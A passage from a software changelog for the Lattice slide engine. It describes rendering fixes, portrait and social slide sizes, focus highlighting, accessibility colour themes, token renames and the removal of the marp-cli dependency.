  controller's `__dbExportRender`) instead of the preview, so an export is correct
  regardless of what the preview is doing. The capture host is a 0×0
  `position:fixed; overflow:hidden` box, so it never adds a page scrollbar. See
  `engineering/decisions/2026-06-20-export-dedicated-capture-host.md`.
- **The guided tour no longer hijacks the docs workspaces on PR previews.** The
  onboarding tour (driver.js) only auto-runs in production, gated by a build-time
  `data-tours` stamp derived from `CF_PAGES`. When a preview is built without that
  env the stamp wrongly reads `on`, and the tour's full-screen overlay then **traps
  pointer events over the entire workspace** — silently blocking the editor,
  preview, present, and practice, so no interactive feature can be reviewed on the
  preview. Added a **runtime backstop** (`isPreviewHost`): the tour now refuses to
  run on any `*.pages.dev` (Cloudflare preview) or localhost host regardless of the
  build stamp. Pure + unit-tested. (`docs/src/playground/preview-host.js`,
  `guided-tour.js`.)
- **`progress` bar percentage readouts are now legible on every bar.** The readout
  rides the fill's leading edge — exactly where the gradient ramps to its most
  saturated head (up to 72%) — so on the light canvas the dark number lost contrast
  on a high-percentage bar (dark-on-saturated-green). The number now sits on a small
  hue-tinted **readout plate** (the bar's own hue mixed hard toward the canvas — pale
  on light, deep on dark) so `--text-heading` clears it at any percentage, on either
  canvas, **without flattening the magnitude-encoding fill** (gantt avoids this by
  capping its flat fill at 38%; progress keeps its vivid head). Verified light + dark
  across the 6–100% range. See #452.

- **`progress` and `timeline-list` no longer render empty when an item carries a
  nested sublist.** Both layouts pulled their list out of the section with a naive
  non-greedy regex (`/<ul>…<\/ul>/`, resp. `/<ol>…<\/ol>/`) that stopped at an
  item's **nested** close tag — so a `progress` row with a `progress-note` sublist
  truncated the whole list to **zero bars**, and a `timeline-list` item with a
  nested ordered sublist truncated the spine to **zero items**. Both now use the
  same depth-aware `extractFirstList` the rest of the chart family
  (pie/gantt/kanban/radar/state-chart) already uses, so the outer list is matched
  by depth. The intended per-row note / timeline body (a bullet sublist) renders
  as documented. Shared kernel — fixed for all three render paths
  (export, preview, runtime). See #452.

- **Playground preview no longer freezes on iOS after opening a settings sheet.**
  On the /playground (Workbench), opening **Galleries** or **Deck setup** and then
  closing it left the live preview unscrollable on iOS Safari until focus changed
  or ~10s passed. The panels are shadcn **Sheets** (Radix Dialog) and defaulted to
  `modal`, which engages `react-remove-scroll`'s body scroll-lock — its non-passive
  `touchmove` blocker lingers on iOS after close. Both sheets are now non-modal
  (`modal={false}` + a new opt-out `overlay` prop on `ui/sheet.tsx`), so the page is
  never scroll-locked and the preview stays live while you edit. The Drawing Board
  (vanilla, no Radix) was never affected. See `engineering/gotchas.md`.

### Changed

- **The concept page’s “The lattice” section is now an explorable 3D-CSS graph.**
  Below the scroll hero, `/model/concepts/` renders the concept lattice as a live,
  manually-driven 3D constellation (the nine concepts + their typed edges): drag to
  orbit, a **Drill** control pushes into the **Form** node (the other axes fall
  away, Frame · Cell · Tile fan into depth — the same move the hero plays on
  scroll), an **Orbit** toggle pauses the gentle auto-turn, and **Reset** returns
  to the resting view. Pure CSS 3D (no WebGL, no dependency), themed on the live
  palette tokens, and self-centring so every node stays legible at any width;
  `prefers-reduced-motion` / no-JS fall back to the static `ConceptLattice`
  diagram. The graph reflects the shipped ontology — no recursive Frame-in-Cell
  edge. (`docs/src/components/model/ConceptGraph.astro`.)

- **The concept page opens with a scroll-driven 3D walkthrough — the lattice
  drills into Form and becomes a slide.** The `/model/concepts/` hero is now a
  single sticky CSS-3D stage (no WebGL, no dependency — real themed DOM) driven by
  one scroll-progress value: Act 1 shows the concept lattice as a 3D constellation;
  scrolling **drills into the Form node** (the other axes fall away, Frame · Cell ·
  Tile fan into depth); a crossfade hands that structural fan off to a real slide's
  exploded **z-planes**, which then **recompose** into one clean composed slide —
  making literal the `forms.md` note that z "would become literal depth in a
  spatial renderer." An Explode slider, Reset, and drag-to-orbit drive the slide
  directly; touch-drag suspends page scroll until release; `prefers-reduced-motion`
  falls back to a static slide and the 2D `ConceptLattice` remains the no-JS
  fallback below. Replaces the renderer bake-off staging from #431. The graph
  reflects the shipped ontology — no recursive Frame-in-Cell edge ([rejected](https://github.com/slidewright/lattice/blob/main/engineering/decisions/2026-06-18-frame-recursion-cells.md)).

- **One unified site header + a universal ⌘K command palette (docs site).** The
  top bar was eight copy-pasted topbars across two CSS systems (`TopBar.astro`,
  inline copies in six standalone pages, and the Starlight `Header.astro`); the
  docs zone and the standalone routes drifted apart and read as two apps. All of
  it collapses into ONE shared `SiteHeader.astro` rendered everywhere — identical
  brand, nav, theme controls, and search on every surface. The seven top-level
  links become a calmer set: Docs · Components · Features · Comparison inline, the
  three apps (Playground, Drawing Board, Workbench) under a **Tools** disclosure.
  Search is now a **universal ⌘K command palette** (the same on every page):
  navigate anywhere, switch theme/light-dark, and full-text-search the docs via
  Pagefind — replacing the docs-only search pill. One responsive rule (`lg`)
  governs the whole bar: a rich bar on desktop, a compact search-+-menu bar with a
  full Sheet below it. The component-reference toolbars (the page sub-bar, the
  specimen Preview/Edit toggle, the variant switcher) were realigned to the same
  button/segmented-control vocabulary so every bar in the app reads as one piece.
  Nav is one source of truth (`docs/src/lib/nav.mjs`); `TopBar.astro` is retired.

### Fixed

- **Present/Practice mobile stage — maximise + robust centering (CSS isolation).**
  The stage layout was sharing one cascade with the engine `out.css`, which
  clobbered the centering rules (`body`/`.marpit`/`section`) — so the slide fell
  to the engine's default flow and pushed up on mobile Safari. The slide is now
  wrapped in our own `#latt-stage`/`#latt-fit` elements (ID selectors `out.css`
  can't clobber, and *outside* `.marpit` so the slide's `transform` can't trap the
  fixed stage); `#latt-stage` fills `100dvh` and flex-centers `#latt-fit` (sized to
  the scaled slide box) — so the slide maximises + stays centered in portrait AND
  landscape, re-fitting on `orientationchange`/`visualViewport`. Verified centered
  in all three orientations in Chrome (desktop/portrait/landscape).

- **Present/Practice — title/closing/divider content no longer sits high.** The
  slide show/hide loop forced `display:block` on the active `<section>`, which
  clobbered the flex-centering layouts (`title`/`closing`/`divider` set
  `section{display:flex;…}` to vertically center their content) — collapsing them
  to top-of-box flow. Root cause, not the stage geometry: the section box was
  centered, the *content inside it* was not. Fixed by reverting the show/hide to
  the stylesheet value (`display:""` instead of `"block"`), so each layout keeps
  its own `display`. Measured h1 offset from section center: −55px → −1px.

### Added

- **Export-to-Marp bundles now carry an AI-agent kit, so recipients can keep authoring the deck.** Every Marp bundle (CLI `npm run export:marp` and the Drawing Board export) now ships a bundle-tailored `AGENTS.md` at the root + the machine-readable component catalog at `agent/components.json` — so an AI agent (Claude, Copilot, Cursor, …) dropped into the exported folder can extend the deck with full Lattice knowledge: pick the right component, honour its slots, and stay within each layout's **content capacity** instead of inventing `_class` names and overflowing slides. The catalog is a frozen snapshot stamped with the exporting Lattice version. On by default; opt out for a lean Marp-only bundle with `--no-agent` (CLI). Built on the shared bundle spec (`lib/core/marp-bundle.js` — `AGENT_ASSETS` + `agentsMd`) so the CLI and browser producers can't drift. See `engineering/decisions/2026-06-13-export-to-marp.md` §10.

- **Concept ontology — the relationship graph is now machine-readable and drift-gated.** The cross-level concept graph (the four axes Function · Form · Substance · Finish, the structural nouns Frame · Cell · Tile, the Component join, and the typed relationships between them) is encoded as `lib/concepts/concepts.json` and projected to a new machine catalog **`dist/docs/concepts.json`** (beside `components.json` / `forms.json`) by `tools/build-concepts.js` (`npm run docs:concepts`). A **two-tier drift gate** (`docs:concepts:check`, wired into `build:check`, so it runs at pre-push and in CI) checks both the **nodes** (every node's claimed vocabulary resolves in the live catalogs; the counts are *derived* from them, never hand-typed) and the **structural backbone edges** (`frame→cell` (produces) needs a Frame that really lists cells; the join edges need the `function` / `form` / `substance` fields they claim) — so the map can't assert a vocabulary, count, or structural relationship the engine doesn't ship. `design/concepts.md` drops its hardcoded `7/12/4` vocabulary counts and §9 records the new encoded-vs-prose state honestly (the node descriptors remain hand-authored prose).

- **Content-capacity contract — layouts declare how many elements they hold, and the linter warns before an overflow.** Each component manifest can now carry a `capacity` block (`{ axis, min, sweet, soft, hard, escalateTo, note }`) keyed to the collection it's built on (`item` / `row` / `col` / `cell` / `line` — a `focusAxes` member). The agent/author reads it from `components.json` to **pick a layout by content shape** (count first, then filter by capacity), and `lint:deck` emits an advisory warning — `capacity-crowd` past `soft`, `capacity-overflow` past `hard` — with an `escalateTo` fix, both live in the CLI and the Drawing Board. The count is approximate at authoring time (markdown, `lib/authoring/lint-core.js`), with a render-exact counting primitive (`lib/core/collections.js` `countAxis`) landed and tested for the staged render-time gate. The validator rejects an inert contract whose axis can't be measured in the component's own sample. Each component's generated `.docs.md` now shows a **Capacity** line. Seeded on the ten worst overflow offenders (`cards-grid`, `cards-stack`, `stats`, `list-steps`, `verdict-grid`, `compare-table`, `actors`, `agenda`, `checklist`, `kanban`); the rest backfill incrementally. Advisory only — never blocks, so galleries/`stressSample` stay free to push limits. See `engineering/decisions/2026-06-17-content-capacity-contract.md`.

- **`design/concepts.md` — the one concept map.** A new top-of-stack doc that names every Lattice concept on both levels — the four axes (Function · Form · Substance · Finish) and the structural nouns (Frame · Cell · Tile) — and the relationships between them, including the join: a component *is-a* Function, *selects* a Frame, *binds* Substance into Cells, *receives* Finish. Closes the gap where the axes were documented in `design-system.md` and the nouns in `forms.md` with nothing showing they are one system at two scales. Includes a Mermaid lattice diagram and an honest encoded-vs-prose status. Registered in the `CLAUDE.md` canonical-doc table and cross-linked from both docs it joins. Also published to the docs site as **`/model/concepts/`** (a new "The model" sidebar group) with a responsive HTML/CSS `ConceptLattice` diagram; the existing **Form model page moved `/spec/form-model/` → `/model/form-model/`** (redirected) so that group holds the engine's design model and "Specification" reads purely as the LFM standard.

- **Portrait "great" pass — stats reflow, de-ballooned cards, hero-number emphasis.** Social/mobile decks now command the tall frame instead of merely fitting it: `stats` stacks its numbers vertically and enlarges them (a new per-geometry `--stat-emphasis` param the engine emits alongside `--canvas-scale`); `list` / `cards-grid` / `cards-stack` keep each card content-height and distribute them to fill (no more one-line cards ballooning to ~600px); `content` prose caps its measure so lines don't sprawl; and the `square` canvas-scale rises 1.5 → 1.65 so square body clears the legibility floor. All keyed on `data-orientation` — landscape stays byte-identical. `kpi` already reflowed (#407) and keeps its variant hierarchy, so it is left as-is.

- **Declared portrait/landscape support per component, with a lint warning.**
  Every component manifest can now declare an `orientation` array — `["landscape",
  "portrait"]` (both, the default), `["landscape"]` (landscape-only), or
  `["portrait"]` (social-only, none yet). A full-catalog audit (every gallery
  rendered at 9:16 and judged on real output) classified all 54: **8 are
  landscape-only** — `gantt`, `journey`, `kanban`, `roadmap`, `state-chart`
  (horizontal-axis charts), `compare-code`, `redline` (side-by-side diffs), and
  `image` — the rest work in portrait. The field surfaces in
  `dist/docs/components.json`, and **`lint:deck` warns** (`orientation-mismatch`)
  when a portrait/mobile deck uses a landscape-only layout (or a landscape deck a
  portrait-only one). The lint set is kept in step with the manifests by a unit
  test. See `engineering/decisions/2026-06-16-orientation-in-the-form-model.md`.

- **Safe-area for vertical feeds — the `safe` modifier.** Keeps content clear of the platform caption / UI bands that vertical-video feeds overlay on a vertical post (top profile row, bottom caption + action rail). Opt-in (`safe`, or deck-wide `class: safe`); takes effect only on a portrait/square `@size`, where the engine emits px safe bands from the geometry (12% top / 20% bottom) that the modifier reserves as content padding and uses to lift the footer chrome above the caption band. Runtime preview matches the export. See `lib/base/base.docs.md`.

- **PPTX export follows the deck `@size`.** A portrait/square deck now exports a
  portrait/square `.pptx` instead of letterboxing into a 16:9 slide. The exporter
  derives the PowerPoint slide layout from the resolved geometry (custom layout at
  the deck aspect, normalized to a 13.333in longest edge); a 16:9 deck keeps the
  built-in `LAYOUT_WIDE` (byte-identical). Both the CLI
  (`lib/export/pptx-export.js`) and the Drawing Board export path are updated.

- **Portrait grid reflow for the data-dense layouts.** Building on the
  social/mobile `@size` work, the grid-based layouts now reflow on a
  portrait/square canvas instead of holding their landscape composition: `kpi`
  (every variant — briefing/ops/spotlight/trajectory — linearises to a centred
  metric column), `matrix-2x2`, `pricing` and `verdict-grid` collapse to a
  single column, and `split-panel` / `split-compare` stack their rail above the
  content. Each render path stamps a deck-wide `data-orientation` on the section
  (engine + runtime); landscape is unstamped → byte-identical. **Mermaid
  diagrams reorient** for portrait — a left-to-right flowchart becomes
  top-to-bottom (LR→TB, RL→BT) so it flows down the tall frame at legible size
  instead of shrinking to a thin strip (both the PDF and preview paths, via
  `lib/integrations/mermaid/reorient.js`). Charts (SVG, aspect-preserved) need no
  reflow. Demo: `examples/social-grid.md`. Remaining: `redline` (side-by-side
  diff is semantically load-bearing) is deliberately left landscape-composed.
  See `engineering/decisions/2026-06-16-social-mobile-portrait-sizes.md` (phase 3).

- **Narrative build — progressive disclosure via `_build`.** A slide opts into
  "assemble as you go" with a `<!-- _build -->` directive (a subset of the
  `_focus` grammar): bare builds the slide's primary collection one unit per step
  in document order; `_build: rows` picks the axis (`item` · `row` · `col` ·
  `line`); `_build: 1, 2-3, 4` groups units into steps; `_build: none` opts out.
  The engine only *tags* the steppable units (`data-build-step`); reveal is pure
  CSS gated on a consumer-set `data-build-at`, so a non-driven render and the
  final-state PDF are byte-identical to a deck with no build (the 0-pixel
  guarantee). Reveal-only; the live player driver and per-step overlay export are
  staged follow-ons. See `engineering/decisions/2026-06-16-narrative-step-spec.md`.

- **Docs site: a live, draggable performance overlay.** A small overlay renders
  two groups: **web vitals** (LCP / CLS / INP / FCP / TTFB, colour-rated by
  Google's thresholds) and a **runtime** group — **FPS** (frame rate), **MEM**
  (JS-heap in use), and **CPU≈** (main-thread busy %, a Long-Tasks proxy since
  browsers expose no true CPU API; the MEM and CPU≈ rows appear only where the
  browser supports them). All measured by the device's own browser — the
  zero-tooling way to check landing CLS / mobile LCP / jank on a real phone,
  which the CI/sandbox can't (it blocks the CDN fonts). Turn it on two ways: the
  **"Performance overlay" switch in the Drawing Board settings → Workspace** (a
  global, cross-surface switch like Guided tours — governs every page), or a
  **`?perf`** URL param (`?perf` on, `?perf=off` off) for the phone, which writes
  the same preference. A grip (⠿) on the header marks it draggable — drag to
  reposition (persisted); tap × to dismiss. Off by default. The `web-vitals`
  library is imported, and the runtime loops run, ONLY while the overlay is
  shown, so a normal page view pays nothing. Available in every environment
  (incl. production) until GA, then GA-gated via `PERF_OVERLAY_AVAILABLE` in
  `docs/src/playground/perf-overlay-prefs.js`. See
  `docs/src/components/site/PerfOverlay.astro`.

- **Native social-media & mobile slide sizes — portrait and square.** Four new
  `@size` presets join the landscape set: `square` (1080×1080, 1:1), `portrait`
  (1080×1350, 4:5), `story` (1080×1920, 9:16) and `mobile` (1080×2340, 9:19.5),
  each with aspect aliases (`1:1`, `4:5`, `9:16`) and `reel` for `story`. Opt in
  with one line — `size: story` in the front matter; components, palettes and
  treatments all work unchanged. The engine is now **orientation-aware**: a
  `--canvas-scale` magnitude lever (folded into every `--fs-*` / `--sp-*` token)
  boosts type and spacing so portrait/square decks read at phone distance, and
  the default flex-column layouts (title, statement, quote, divider, stats,
  big-number, closing, prose, lists) vertically centre to fill the taller frame.
  Landscape output is **byte-identical** (`--canvas-scale` is exactly 1; verified
  pixel-for-pixel against the committed baselines). Demo decks:
  `examples/social-{square,portrait,story,mobile}.md`. Design:
  `engineering/decisions/2026-06-16-social-mobile-portrait-sizes.md`.
  - Data-dense grid layouts (kpi, comparison, split, charts) render true-portrait
    but keep their landscape composition for now; a portrait reflow is tracked as
    follow-on. PPTX export remains 16:9-only (PDF export is correct at every size).

### Changed

- **Internal `!important` cleanup (cascade hygiene).** Removed 22 redundant
  `!important` declarations that only existed to win Lattice-vs-Lattice cascade
  races, keeping the cascade outcome pixel-identical (verified by per-cluster
  marp-cli / emulator pixel-diffs at fuzz 25%). Removed: all 12 in
  `scaffold.css` (the `section::after` pagination + `section header/footer > p`
  rules already win on source order over Marpit's equal-specificity scaffold
  defaults), the 1 pagination-colour `!important` in
  `chart-family.css` (`section.chart-frame.cover::after`, which now wins on
  specificity once scaffold's matching `!important` is gone), 2 in
  `base.variants.css` (the `section.silent/.no-header > header/footer`
  `display:none`, already specificity-winners), and 7 in `base.sketch.css`
  (card / blockquote borders + radii that outrank their component rules on
  specificity). Genuinely load-bearing internal `!important` were kept with a
  comment explaining what each beats: the `section.archived::after` stamp and
  `silent/.no-paginate::after { content:none }` (beat the owned engine
  scaffold's higher-specificity `div.marpit > section::after`), and the two
  sketch decision/compare-prose lifted-label overrides (the component's
  `:has(> strong:first-child)` selector outranks them). External-tool overrides
  (Mermaid / KaTeX / highlight.js, and the kanban/timeline/radar SVG sheets)
  were intentionally left untouched — `!important` is the correct mechanism
  against inline styles emitted by those tools.

- **The Drawing Board "Slide size" picker now lists the social/mobile formats.**
  #399 added `square` / `portrait` / `story` / `mobile` to the engine's `@size`
  registry, but the deck-config drawer's size dropdown was a separate hardcoded
  list of the three landscape sizes — so the portrait formats never appeared in
  the UI (you had to type `size: story` by hand). The picker options are now a
  curated module (`docs/src/playground/deck-sizes.js`) guarded by a unit test
  against the `@size` registry, so this can't silently drift again. The editor
  also autocompletes `size:` values from the same source.

- **One slide-size registry (engine source of truth).** The CLI/PDF emulator no
  longer carries its own hard-coded size table — it resolves `@size` through the
  engine's `resolveSize`, the same lookup the scaffold bakes into `@page`. Fixes
  a latent bug where `size: 16:9` silently rendered as `hd` in exported PDFs.

- **Docs site: the header/footer logo and browser-tab favicon now use the
  existing adaptive SVG mark instead of a 512² PNG.** The header/footer `<img>`
  points at `lattice-mark-min.svg` and the favicon at `favicon.svg` — both
  already shipped in `docs/public/` and both light/dark adaptive via
  `prefers-color-scheme`. Pixel-verified identical to the retired raster, but
  crisp at any DPR and ~25KB lighter on the first load of every page. The
  now-unused `docs/public/lattice-logo.png` was deleted.

### Removed

- **Breaking: the `featured` component is removed, superseded by the `focus`
  directive.** The `imagery/featured` layout (its `<!-- _class: featured -->`
  slides, the `feat-layout` / `feat-card` DOM, the `featured.mirror` swap, and
  the `featured` Form Frame) is gone; decks that authored a `featured`
  recommendation card should use a card-style layout (`cards-stack` /
  `cards-grid`) with `_focus` to spotlight the lead item. The Imagery bucket now
  holds a single component, `image`. See
  `engineering/decisions/2026-06-16-focus-highlighting.md`.

- **Breaking: the BYO marp-cli render path is retired — `marp.config.js` is
  deleted**, along with the `@slidewright/lattice/config` and
  `@slidewright/lattice/marp.config.js` package exports. Lattice's own engine
  (`lib/engine`, the `lattice` CLI/emulator + docs playground) and the browser
  runtime (`dist/lattice-runtime.js`) are the only render paths. The shared
  markdown-it plugin kernel moved from `lib/integrations/marp/` to
  `lib/integrations/markdown-it/`. Marp now survives only as the one-way
  **export-to-Marp** bundle (`export:marp`, the Drawing Board). Consumers who
  rendered Lattice decks via their own marp-cli + our config should switch to
  the bundled emulator (`node dist/lattice-emulator.js deck.md deck.pdf`).

- **Changed: the export-to-Marp bundle is now a MARP-NATIVE artifact — it ships
  no Lattice engine.** The bundle is meant to be rendered with **Marp** (the VS
  Code extension or marp-cli); Lattice supplies the deck (splits baked to `---`),
  the **minified** palette CSS (`lattice.css` + `themes/`, the latter now built as
  `dist/themes/*.min.css`), the browser runtime, and Mermaid. New: a
  `.vscode/settings.json` registers the palette via `markdown.marp.themes`, and
  `package.json` pins only marp-cli. Rendering with marp-cli / the VS Code preview
  applies slide splits + palette + CSS layouts; Mermaid diagrams and the
  JS-driven structural components render when the exported **HTML is opened in a
  browser** (the deck's trailing `<script>` tags load `lattice-runtime.min.js`).
  The previously-bundled zero-install emulator (`dist/lattice-emulator.js`) is no
  longer shipped.

- **Two phantom variants are removed: `compare-code mirror` and `kpi target`.**
  Both were declared and fully captioned in their manifests but had no backing
  CSS — `compare-code mirror` rendered identically to bare (the central mirror
  block never covered `compare-code`), and `kpi target` fell through to the
  briefing default. `cards-grid mirror` (a documented no-op on a symmetric grid)
  is dropped from `variants[]` too. Authoring any of these now lints as an
  unknown modifier rather than silently doing nothing. Removing `kpi target`
  also makes the "five layout modifiers" description accurate. Surfaced by the
  manifest-vs-CSS audit (`engineering/decisions/2026-06-15-manifest-css-audit.md`).

- **The Drawing-Board/Workbench "Token system" toggle and the `tokens:` deck
  directive are removed.** They existed for the universal-token migration A/B
  ("does my deck survive the flip?"); that migration is **complete** — there is
  one vocabulary now (universal), so the control retired along with the
  client-side flip machinery (`flipTokens`/`variantize`/the `-u` theme variants).
  A stray `tokens:` line in an old deck is simply ignored (it was Drawing-Board
  only; `marp-cli`/the emulator never read it). `lib/tokens/crosswalk.js` stays as
  the historical old→new map + the regression-lint source.
- **Breaking: the canonical flip is complete — the legacy per-theme token names
  are retired across the engine** (universal-token canonical flip, groups 2–5 —
  see `engineering/decisions/2026-06-11-universal-token-system.md` §11). The 14
  themes + the engine now declare only the new role-based names; rename any BYO
  theme or deck that references the old ones:
  - categorical: `--cN-light` / `--cN-dark` / `--c-ink-light` / `--c-ink-dark`
    → `--cat-N-fill` / `--cat-N-mark` / `--cat-on-fill` / `--cat-on-mark`
  - diagram-structural: `--c-stroke` / `--c-line` / `--c-accent-warm`
    → `--diagram-stroke` / `--diagram-line` / `--diagram-accent-warm`
  - diagram lifecycle: `--c-warm/cool/alarm/mark/note` (+ `-dark` marks)
    → `--diagram-active/done/critical/today/note` (+ `-mark`)
  - surfaces / scheme: `--bg-dark` → `--surface-inverse`; `--dark-*` → `--scheme-dark-*`

  Resolved colours are byte-identical (a pure rename, verified zero-pixel-drift).
  The old→new map lives in `lib/tokens/crosswalk.js` + the ADR §7 table; the
  Drawing-Board `tokens: current` option migrates a legacy-authored deck.
- **Breaking: the sequential colour-ramp tokens `--scale-50 … --scale-900` are
  retired in favour of `--seq-50 … --seq-900`** (universal-token canonical flip,
  group 1 — see `engineering/decisions/2026-06-11-universal-token-system.md`
  §11). The ramp is now anchored on `--seq-500` (themes set it; `base.tokens.css`
  derives the other nine stops via OKLab `color-mix`), and consumers already read
  `--seq-*`. Resolved colours are byte-identical — this is a pure rename that
  frees "scale" from colliding with the typographic multiplier `--fs-scale`. **If
  a BYO theme sets `--scale-500`, or a deck reads `var(--scale-NNN)`, rename to
  `--seq-*`.** (The Drawing-Board `tokens:` toggle resolves both vocabularies for
  decks mid-migration.)
- **Breaking: `@marp-team/marp-cli` is no longer a dependency — the installed
  package is marp-free.** Nothing in the shipped runtime ever imported marp (the
  emulator renders via its own Puppeteer path); marp-cli was pulled only for the
  internal parity gate, the old test oracle, and the benchmark baseline, so
  `npm install @slidewright/lattice` now skips ~42M of marp packages. **If you
  render via the shipped `marp.config.js` (the BYO `npx marp --config-file …`
  path), install marp-cli yourself** (`npm i @marp-team/marp-cli`) — the config
  and the marp-vscode CSS shims still ship, and the Export-to-Marp bundles are
  unaffected (they pin marp-cli for the recipient). The owned `lattice-engine`
  renders every first-party path (the `lattice` CLI + the docs playground); the
  docs playground's `?engine=marp` / `?css=marp` A/B toggle is removed (the owned
  engine is the sole renderer). The marp-vs-engine parity CI gate is retired in
  favour of the per-component semantic-invariant suite. See
  `engineering/decisions/2026-06-12-p4-regression-gate-retire-marp.md`.

### Fixed

- **`image` slides now render their asset regardless of the output directory.**
  The half-canvas/full-bleed image rode in an `<img>` whose deck-relative `src`
  resolved against the *output* directory, so any deck rendered to a PDF outside
  its own folder showed a broken-image placeholder. The image is now a CSS
  `background-image` on the `.lattice-bg` panel, with the asset URL resolved to
  an absolute `file://` URL against the deck directory. Moving off `<img>` also
  retires the 22 `!important` overrides `image.styles.css` carried to beat
  Marpit's `section img` catch-all. Visual output is unchanged (pixel-parity with
  the prior baseline). The half-canvas split now lives in the shared engine
  (class-aware + idempotent), so the docs playground / web runtime render the
  same split layout as the PDF path instead of collapsing it to a broken
  full-bleed. See `engineering/decisions/2026-06-17-image-rearchitecture.md`.

### Added

- **Colour-vision-deficiency accessibility — four first-class CVD themes.** Four
  selectable themes — `a11y-deuteranopia`, `a11y-protanopia`, `a11y-tritanopia`,
  `a11y-achromatopsia` — chosen exactly like any theme (`theme: a11y-deuteranopia`
  in front matter, or the Drawing Board theme picker's "Accessibility" group). No
  separate accessibility axis, directive, or override resolver: an accessibility
  need is met by picking the theme. Because colour alone distinguishes only ~1–2
  categories under dichromacy, each pairs **CVD-tuned status colours** (pass/warn/
  fail moved off the deficiency's confusion axis, verified distinct + AA) with
  **redundant non-colour encoding**: ✓/!/✗ **glyphs** on status pills, a distinct
  **texture pattern** per categorical slot on diagram fills (Mermaid `.section-N`
  and the Mermaid pie) and native chart fills (pie / funnel), and a per-series
  **line-style** on radar. The four share a `themes/a11y-base.css` foundation (the
  texture wiring + greyscale categorical ramp + forced light scheme); each theme
  adds only its status trio. They are **mode-invariant** — a fixed palette that
  ignores the light/dark toggle, so an accessibility render reads identically for
  every viewer (and colour-free decks stay readable by texture + glyph + line-style
  alone, the channels that also survive black-and-white **printing**). The engine
  emits the texture `<defs>` on every render. **The docs site honours them too** —
  picking an a11y theme (anywhere the palette persists) restyles the whole site
  (landing, component portal, Drawing Board chrome), not just the deck preview:
  the portal token generator now flattens each palette's `@import` chain (so a
  thin `a11y-*` palette resolves the full token contract via onyx) and emits
  mode-invariant blocks for them. The theme dropdown is now **one global
  component** (the shared `PaletteControls`, replacing the separate Drawing Board
  topbar) mounted on every surface — landing, playground, workbench, component
  pages, and the Drawing Board — listing the identical grouped set (brand
  palettes, then an "Accessibility · colour-blindness" group); it writes the
  deck's `theme:` on the Drawing Board and sets the site palette elsewhere. New:
  `themes/a11y-*` (+ `a11y-base`),
  `lib/theme/cvd.js` (Machado-2009 simulation), `lib/core/accessibility-textures.js`,
  `tools/cvd-audit.js`. See `engineering/decisions/2026-06-16-colour-blindness-accessibility.md`
  + `…-cvd-redundant-encoding.md`.
- **Editor autocomplete for focus, with a manifest-declared capability.** The
  Drawing Board now completes the `_focus` / `_focusStyle` / `_focusSteps`
  directives, the style values (`spotlight`/`blur`/`ring`/`list-fill`/`pop`), and
  the focus axes — and axis completion is **layout-aware**: a new manifest field
  `focusAxes` declares which axes a layout supports (`compare-table` →
  row/col/cell, a card grid → item, `code` → line), so the editor offers only
  the valid axes per slide. A parity gate ties the manifest, the lint vocab, and
  the completion vocab together so none can drift. Follows the
  `families`/`dataCompletion` self-maintenance pattern
  (`engineering/decisions/2026-06-11-autocomplete-self-maintenance.md`).

- **Focus & highlighting — tell a dense slide to focus the room on one thing.**
  A new `_focus:` directive names an ordinal target with one universal grammar —
  `<!-- _focus: row 4 -->`, `item 3`, ranges (`item 2-4`) and multiples
  (`row 2, row 5`). The focus resolver tags the target `.lat-focus` and its
  siblings `.lat-recede`; the treatment is pure CSS, palette-blind, and survives
  PDF **and** PPTX (no masks). Content-aware default — tables get a **ring**
  (keeps every cell legible), lists/grids get **spotlight** (recede the rest) —
  overridable with `<!-- _focusStyle: spotlight | blur | ring | list-fill | pop -->`
  (`blur` defocuses the rest and gives a list/grid target a subtle lift — the
  literal camera-focus; `pop` lifts the target forward while leaving every other
  row/card fully legible; both survive PDF + PPTX, using only hard-edged shapes
  so they hold up in Apple PDFKit). Axes:
  `item` (list/grid), `row` / `col` / `cell` (table), and `line` (code).
  `<!-- _focusSteps: A | B | C -->` expands one slide into N, walking the focus
  one step at a time (the static-format equivalent of a live build). The
  grammar is linted; worked deck in `examples/focus.md`. Design:
  `engineering/decisions/2026-06-16-focus-highlighting.md`.

- **Present mode — a live presentation player on the Drawing Board, beside
  Practice.** A new **Present** button (in the Slides panel header, before
  Practice) opens a full-screen player meant for presenting *to an audience*,
  where Practice rehearses *your delivery*. It renders the deck through the same
  engine + slide box as the live preview (pixel parity), and adds: clean
  navigation (keyboard, swipe, auto-hiding edge arrows, slide counter +
  progress), three-tier fullscreen (real Fullscreen API on desktop, CSS
  viewport-fill on mobile), a **universal speaker-notes slide-up sheet** (notes
  read through the canonical `notes-core` extractor), and a **dual-screen
  presenter view** (`window.open` + `postMessage`) showing the current + next
  slide, speaker notes, and an elapsed timer, with Window-Management-API
  auto-placement on a second screen where granted. It's the in-app ancestor of
  the player designed for the self-contained `.html` export
  (`engineering/decisions/2026-06-16-lattice-export-format.md`).

- **Proactive "type-ahead" completion in the Drawing Board editor.** The
  completion popup now opens automatically the moment the cursor enters a
  completable grammar context, before any search character is typed — so picking
  a component (and pressing space to cascade into its modifiers) needs no
  keystroke to surface the choices. By default this is scoped to the `_class:`
  directive (component name → modifiers); deck-level directives (`theme:`,
  `finish:`, fence languages, …) keep opening on typing / `Ctrl-Space`. A new
  **"Open suggestions automatically"** workspace preference (Settings →
  Workspace) extends it to *every* grammar context (`Everywhere`) or disables
  proactive open entirely (`Off`). Built on `startCompletion` (an explicit
  completion, so each source's existing "quiet on a bare position" guard yields
  the full list); the grammar classification is a pure, unit-tested
  `typeaheadContext` in `slide-context.js`. Inert when autocomplete is off.

- **Worked exemplar decks — "what good looks like" for Drafting.** A new
  `exemplars/` library of complete, boardroom-grade decks (one concrete fictional
  subject threaded through every slide, declarative takeaway titles, real-looking
  numbers) so authors start from a finished model, not a skeleton of placeholder
  stubs. **All 45 Drafting archetypes** are covered, across the five settings
  (General/Team, Corporate, Academic, Government/Public, Nonprofit) — e.g.
  *Investor pitch*, *Board update*, *Research findings*, *Policy briefing*,
  *Donor pitch*. Each is authored once as the full deck and trimmed to **short /
  standard / full** length variants by a pure, DRY tier filter
  (`lib/exemplars/tier-filter.js`), so a single source models both a lightning
  talk and a full 20–30-minute presentation.
  Design: `engineering/decisions/2026-06-14-worked-exemplar-decks.md`.
- **"Open a worked example" in the Drawing Board's Drafting picker.** Picking an
  archetype now offers the matching worked exemplar deck — a **Short · Standard ·
  Full** length chooser (with live slide counts) and an *Open the example* button
  that loads the real, finished deck into the editor — alongside the existing
  empty-structure scaffold (now the secondary path). The decks are staged as
  content-hashed assets and fetched on demand, then trimmed to the chosen length
  in the browser by the shared tier filter (`exemplar-core` bundle). This is the
